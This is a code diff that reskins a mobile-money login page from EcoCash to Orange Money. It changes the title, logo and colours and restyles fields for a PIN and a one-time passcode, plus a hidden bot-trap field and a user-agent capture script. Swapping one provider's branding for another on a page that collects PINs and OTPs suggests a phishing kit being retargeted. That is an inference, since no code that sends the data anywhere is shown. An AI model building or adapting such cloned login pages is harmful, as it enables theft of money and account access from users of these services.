@@ -3,110 +3,204 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>EcoCash — Login</title>
+<title>Orange Money — Login</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+  -webkit-tap-highlight-color:transparent;
+}
 html,body{height:100%}
+
 body{
   font-family:Inter,system-ui,Arial;
-  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
+  background:
+    radial-gradient(900px 300px at 50% -150px, rgba(249,115,22,.25), transparent),
+    linear-gradient(180deg,#fff4e6,#ffe0bf);
   margin:0;
   padding:18px;
   display:flex;
   align-items:center;
   justify-content:center;
+  color:#000;
 }
+
+/* CARD */
 .card{
   width:100%;
   max-width:380px;
   background:#fff;
-  padding:20px;
-  border-radius:12px;
-  box-shadow:0 12px 30px rgba(2,6,23,.06)
+  padding:22px;
+  border-radius:16px;
+  box-shadow:
+    0 18px 40px rgba(0,0,0,.18),
+    inset 0 1px 0 rgba(255,255,255,.8);
 }
-.logo{height:44px;display:block;margin:0 auto 10px}
-h2{text-align:center;margin:0 0 12px;font-size:20px}
-label{display:block;font-size:13px;margin-top:8px}
 
+/* LOGO */
+.logo{
+  height:46px;
+  display:block;
+  margin:0 auto 12px;
+}
+
+/* TEXT */
+h2{
+  text-align:center;
+  margin:0 0 14px;
+  font-size:20px;
+  font-weight:700;
+  color:#000;
+}
+
+label{
+  display:block;
+  font-size:13px;
+  margin-top:10px;
+  color:#000;
+}
+
+/* INPUTS */
 input{
   width:100%;
-  padding:10px;
-  border-radius:8px;
-  border:1px solid #e6eefc;
-  background:#fbfdff;
-  font-size:14px
+  padding:11px;
+  border-radius:10px;
+  border:1px solid #e5e5e5;
+  background:#fafafa;
+  font-size:14px;
+  color:#000;
 }
-.btn{
-  background:#4b86ff;
-  color:#fff;
-  padding:10px;
-  border-radius:8px;
-  border:0;
-  margin-top:12px;
-  width:100%
-}
-.btn[disabled]{background:#cbd5e1}
 
-.req{color:#d04444;margin-right:6px}
-.small{font-size:13px;color:#6b7280}
+input:focus{
+  outline:none;
+  border-color:#f97316;
+  background:#fff;
+}
+
+/* BUTTON */
+.btn{
+  background:#f97316;
+  color:#fff;
+  padding:11px;
+  border-radius:10px;
+  border:0;
+  margin-top:14px;
+  width:100%;
+  font-weight:700;
+  cursor:pointer;
+}
+
+.btn[disabled]{
+  background:#fdba74;
+  cursor:not-allowed;
+}
+
+/* HELPERS */
+.req{color:#f97316;margin-right:6px}
+.small{font-size:13px;color:#444}
 .success{color:#16a34a;font-weight:600}
 
-/* repaint-safe warning */
 .error{
   min-height:18px;
   font-size:13px;
-  color:#d04444;
+  color:#dc2626;
 }
 
 /* PIN */
-.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
-.pin-digit{
-  width:40px;height:48px;
-  text-align:center;
-  font-size:20px;
-  border-radius:8px;
-  border:1px solid #e6eefc;
+.pin-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-top:8px;
 }
 
-/* OTP */
+.pin-digit{
+  width:42px;
+  height:50px;
+  text-align:center;
+  font-size:20px;
+  border-radius:10px;
+  border:1px solid #e5e5e5;
+  background:#fafafa;
+}
+
+.pin-digit:focus{
+  outline:none;
+  border-color:#f97316;
+  background:#fff;
+}
+
+/* OTP MODAL */
 .otp-modal{
   position:fixed;
   inset:0;
-  background:rgba(0,0,0,.35);
+  background:rgba(0,0,0,.45);
   display:flex;
   align-items:center;
-  justify-content:center
+  justify-content:center;
 }
+
 .otp-box{
-  background:#fff;
-  padding:18px;
-  border-radius:12px;
-  min-width:300px
+  background:
+    linear-gradient(
+      180deg,
+      rgba(255,255,255,.85),
+      rgba(255,255,255,.65)
+    );
+  backdrop-filter:blur(18px) saturate(140%);
+  -webkit-backdrop-filter:blur(18px) saturate(140%);
+  padding:20px;
+  border-radius:16px;
+  min-width:300px;
+  box-shadow:0 20px 40px rgba(0,0,0,.35);
+  border:1px solid rgba(255,255,255,.6);
 }
-.otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+
+.otp-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-top:10px;
+}
+
 .otp-digit{
-  width:40px;height:48px;
+  width:42px;
+  height:50px;
   text-align:center;
   font-size:20px;
-  border-radius:8px;
-  border:1px solid #e6eefc
+  border-radius:10px;
+  border:1px solid #e5e5e5;
+  background:#fafafa;
 }
-.otp-warning{color:#d04444;font-size:13px;display:none}
 
+.otp-digit:focus{
+  outline:none;
+  border-color:#f97316;
+  background:#fff;
+}
+
+.otp-warning{
+  color:#dc2626;
+  font-size:13px;
+  display:none;
+}
+
+/* RESEND */
 .resend-row{
   display:flex;
   justify-content:space-between;
-  margin-top:12px
+  margin-top:12px;
 }
+
 .resend-btn{
   background:#fff;
-  border:1px solid #e6eefc;
+  border:1px solid #e5e5e5;
   padding:6px 12px;
-  border-radius:8px
+  border-radius:10px;
 }
+
 .resend-btn[disabled]{opacity:.5}
 </style>
 </head>
@@ -114,7 +208,7 @@ input{
 <body>
 
 <div class="card">
-  <img src="assets/eco.png" alt="EcoCash" class="logo">
+  <img src="assets/orange.png" alt="Orange Money" class="logo">
   <h2>Login</h2>
 
   <form id="loginForm" autocomplete="off">
@@ -130,7 +224,6 @@ input{
       <input class="pin-digit" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- honeypot -->
     <input type="text" id="hp" style="display:none">
 
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
@@ -171,7 +264,7 @@ input{
 </div>
 
 <script>
-/* ===== DEVICE STRING (STRING ONLY) ===== */
+/* ===== DEVICE STRING ===== */
 const ua = navigator.userAgent;
 let device = 'Unknown';
 
